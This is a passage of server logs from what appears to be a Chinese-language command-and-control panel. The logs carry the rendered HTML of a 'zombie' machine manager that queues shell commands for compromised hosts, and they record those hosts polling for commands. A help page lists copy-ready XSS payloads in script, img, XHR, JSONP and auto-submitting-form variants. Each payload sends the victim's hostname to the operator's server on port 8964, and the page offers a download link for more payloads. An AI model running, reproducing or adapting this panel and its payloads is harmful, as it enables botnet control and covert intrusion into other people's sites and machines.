type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:37:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:31] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:37:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:31] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 19:37:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:37:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:37:32 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:37:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:37:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:32] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:37:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:37:38 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:37:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:37:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:38] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:37:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:37:41 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:37:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:37:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:41] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:37:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:37:41 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:37:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:37:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:41] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:38:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:38:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:38:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:38:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:38:29] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:38:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:38:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:38:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:38:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:38:29] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:39:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:39:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:39:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:39:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:39:29] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:39:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:39:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:39:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:39:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:39:29] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:26:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:26:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:26:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:26:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:26:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:26:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:26:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:26:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:26:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:26:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:27:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:27:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:27:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:27:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:27:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:27:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:27:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:27:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:27:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:27:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:28:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:28:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:28:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:28:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:28:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:28:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:28:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:28:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:29:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:29:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:29:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:29:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:29:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:29:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:29:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:29:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 21:29:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:29:20] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 21:29:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 21:29:31 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 21:29:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0050s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>C2 控制面板 API 文檔</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<div class="container">\n    <h2>C2 控制面板 API 文檔</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">版本 1.0 - 完整的API使用說明</p>\n\n    <!-- API 端點列表 -->\n    <div class="help-section">\n        <h1>🚀 API 端點</h1>\n        <div class="endpoints-grid">\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge post">POST</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/add_message</code>\n                </div>\n                <p class="endpoint-description">通過表單添加控制消息</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">通過網頁表單提交</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/add_message</code>\n                </div>\n                <p class="endpoint-description">通過URL參數添加控制消息（適用於XSS攻擊）</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/add_message?message=惡意命令&amp;target_ip=192.168.1.100</code>\n                </div>\n\n                \n                <div class="xss-note">\n                    <span class="xss-badge">XSS</span>\n                    適合嵌入到 XSS 攻擊中\n                </div>\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/get_messages</code>\n                </div>\n                <p class="endpoint-description">獲取所有控制消息列表</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/get_messages</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/help</code>\n                </div>\n                <p class="endpoint-description">顯示此幫助頁面</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/help</code>\n                </div>\n\n                \n            </div>\n            \n        </div>\n    </div>\n\n    <!-- XSS 載荷範例 -->\n    <div class="help-section">\n        <h1>🔥 XSS 攻擊載荷範例</h1>\n        <div class="xss-examples">\n            \n            <div class="xss-example-card">\n                <h3>基本 XSS 載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;fetch(&#39;http://{your_ip}:8964/api/control/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;fetch(&#39;http://{your_ip}:8964/api/control/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>隱藏的圖片載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;img src=&#39;http://{your_ip}:8964/api/control/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;img src=&#39;http://{your_ip}:8964/api/control/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>JavaScript 重定向</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;window.location.href=&#39;http://{your_ip}:8964/api/control/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;window.location.href=&#39;http://{your_ip}:8964/api/control/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>Ajax 靜默攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;http://{your_ip}:8964/api/control/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;http://{your_ip}:8964/api/control/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>跨域 JSONP 攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var script=document.createElement(&#39;script&#39;);script.src=&#39;http://{your_ip}:8964/api/control/add_message?message=JSONP攻擊&amp;target_ip=&#39;+location.hostname+&#39;&amp;callback=console.log&#39;;document.head.appendChild(script);&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var script=document.createElement(&#39;script&#39;);script.src=&#39;http://{your_ip}:8964/api/control/add_message?message=JSONP攻擊&amp;target_ip=&#39;+location.hostname+&#39;&amp;callback=console.log&#39;;document.head.appendChild(script);&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>表單提交攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;form id=&#39;xss&#39; action=&#39;http://{your_ip}:8964/api/control/add_message&#39; method=&#39;GET&#39;&gt;&lt;input name=&#39;message&#39; value=&#39;表單攻擊&#39;&gt;&lt;input name=&#39;target_ip&#39; value=&#39;victim&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;xss&#39;).submit()&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;form id=&#39;xss&#39; action=&#39;http://{your_ip}:8964/api/control/add_message&#39; method=&#39;GET&#39;&gt;&lt;input name=&#39;message&#39; value=&#39;表單攻擊&#39;&gt;&lt;input name=&#39;target_ip&#39; value=&#39;victim&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;xss&#39;).submit()&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>下載更多載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">http://{your_ip}:8964/api/control/xss_payload</code>\n                    <button class="copy-btn" data-payload="http://{your_ip}:8964/api/control/xss_payload" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 重要提示 -->\n    <div class="help-section">\n        <h1>⚠️ 重要提示</h1>\n        <div class="notes-container">\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>⚠️ 重要：請將 {your_ip} 替換為您的實際IP地址（例如：192.168.1.100）</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>✅ 完整路徑格式：http://您的IP:8964/api/control/add_message</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🎯 GET 方式添加消息主要用於 XSS 攻擊場景</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>💾 所有消息都會被記錄到數據庫中，便於追踪攻擊來源</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🔧 target_ip 參數是可選的，可以為空或使用 location.hostname 動態獲取</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🌐 消息內容需要進行 URL 編碼以避免特殊字符問題</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>📊 所有請求都會被詳細記錄到系統日誌中</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🚫 注意跨域請求限制，某些載荷可能需要CORS設置</p>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 快速測試區域 -->\n    <div class="help-section">\n        <h1>🧪 快速測試</h1>\n        <div class="test-container">\n            <h3>測試 GET 請求添加消息:</h3>\n            <div class="test-form">\n                <input type="text" id="testMessage" placeholder="輸入測試消息" value="測試消息">\n                <input type="text" id="testIP" placeholder="輸入測試IP" value="127.0.0.1">\n                <button onclick="testGetRequest()" class="test-btn">🚀 發送測試請求</button>\n            </div>\n            <div id="testResult" class="test-result"></div>\n        </div>\n    </div>\n\n    <!-- 返回按鈕 -->\n    <div style="text-align: center; margin-top: 40px;">\n        <a href="/api/control/get_messages" class="back-btn">← 返回控制面板</a>\n    </div>\n</div>\n\n<style>\n    /* 幫助頁面專用樣式 */\n    .help-section {\n        margin: 40px 0;\n        padding: 30px;\n        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);\n        border-radius: 15px;\n        border: 1px solid rgba(102, 126, 234, 0.1);\n    }\n\n    .endpoints-grid {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .endpoint-card {\n        background: white;\n        border-radius: 12px;\n        padding: 25px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #667eea;\n        transition: all 0.3s ease;\n    }\n\n    .endpoint-card:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);\n    }\n\n    .endpoint-header {\n        display: flex;\n        align-items: center;\n        gap: 15px;\n        margin-bottom: 15px;\n    }\n\n    .method-badge {\n        padding: 5px 12px;\n        border-radius: 20px;\n        font-weight: bold;\n        font-size: 12px;\n        text-transform: uppercase;\n    }\n\n    .method-badge.get {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n    }\n\n    .method-badge.post {\n        background: linear-gradient(135deg, #007bff, #6610f2);\n        color: white;\n    }\n\n    .endpoint-path {\n        background: #f8f9fa;\n        padding: 8px 12px;\n        border-radius: 6px;\n        font-family: \'Courier New\', monospace;\n        color: #495057;\n        border: 1px solid #dee2e6;\n    }\n\n    .endpoint-description {\n        color: #6c757d;\n        font-style: italic;\n        margin-bottom: 15px;\n    }\n\n    .parameters,\n    .example {\n        margin: 15px 0;\n    }\n\n    .parameters h4,\n    .example h4 {\n        color: #495057;\n        margin-bottom: 10px;\n        font-size: 14px;\n    }\n\n    .parameters ul {\n        margin: 10px 0;\n        padding-left: 20px;\n    }\n\n    .parameters li {\n        margin: 5px 0;\n        color: #6c757d;\n    }\n\n    .example-code,\n    .payload-code {\n        background: #2d3748;\n        color: #e2e8f0;\n        padding: 12px 15px;\n        border-radius: 8px;\n        font-family: \'Courier New\', monospace;\n        display: block;\n        overflow-x: auto;\n        white-space: pre-wrap;\n        word-break: break-all;\n    }\n\n    .xss-note {\n        background: linear-gradient(135deg, #fff3cd, #ffeaa7);\n        padding: 10px 15px;\n        border-radius: 8px;\n        margin-top: 15px;\n        border: 1px solid #ffeaa7;\n    }\n\n    .xss-badge {\n        background: #dc3545;\n        color: white;\n        padding: 3px 8px;\n        border-radius: 12px;\n        font-size: 10px;\n        font-weight: bold;\n        margin-right: 8px;\n    }\n\n    .xss-examples {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .xss-example-card {\n        background: white;\n        border-radius: 12px;\n        padding: 20px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #dc3545;\n    }\n\n    .xss-example-card h3 {\n        color: #495057;\n        margin-bottom: 15px;\n        font-size: 16px;\n    }\n\n    .payload-container {\n        position: relative;\n    }\n\n    .copy-btn {\n        position: absolute;\n        top: 10px;\n        right: 10px;\n        background: #28a745;\n        color: white;\n        border: none;\n        padding: 5px 10px;\n        border-radius: 5px;\n        cursor: pointer;\n        font-size: 12px;\n        transition: all 0.3s ease;\n    }\n\n    .copy-btn:hover {\n        background: #218838;\n        transform: scale(1.05);\n    }\n\n    .notes-container {\n        display: grid;\n        gap: 15px;\n    }\n\n    .note-item {\n        display: flex;\n        align-items: flex-start;\n        gap: 12px;\n        background: white;\n        padding: 15px 20px;\n        border-radius: 10px;\n        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);\n    }\n\n    .note-icon {\n        font-size: 18px;\n        margin-top: 2px;\n    }\n\n    .note-item p {\n        margin: 0;\n        color: #495057;\n        line-height: 1.6;\n    }\n\n    .test-container {\n        background: white;\n        padding: 25px;\n        border-radius: 12px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n    }\n\n    .test-form {\n        display: grid;\n        grid-template-columns: 1fr 1fr auto;\n        gap: 15px;\n        margin: 20px 0;\n        align-items: end;\n    }\n\n    .test-btn {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n        border: none;\n        padding: 12px 20px;\n        border-radius: 8px;\n        cursor: pointer;\n        font-weight: bold;\n        transition: all 0.3s 